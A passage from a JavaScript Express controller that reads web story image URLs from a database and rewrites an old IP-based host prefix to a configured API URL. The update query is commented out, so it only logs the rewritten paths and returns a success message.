            `SELECT "Id", "WebStoryImageUrl" FROM "WebStoryImage"`
          );

          await Promise.all(
            WebStoryImage.map(async (item) => {
              const image = item.WebStoryImageUrl;
              if (image && image.includes("http://147.93.104.111:8000")) {
                const newImageUrl = image.replace(
                  "http://147.93.104.111:8000",
                  API_URL
                );
                console.log("WebStoryImage Image: ", newImageUrl);
                // await pool.query(
                //   `UPDATE "WebStoryImage" SET "WebStoryImageUrl" = $1 WHERE "Id" = $2`,
                //   [newImageUrl, item.Id]
                // );
              }
            })
          );
          break;

        default:
          return res.json({
            success: 0,
            message: "Invalid type",
          });
      }

      console.log("Image path updated successfully");

      return res.json({
        success: 1,
        message: "Image path updated successfully",
      });
    } catch (error) {
      console.error(error);
      res.status(500).json({ status: false, message: error?.message });
    }
  }
}

export default new GetDivineController();
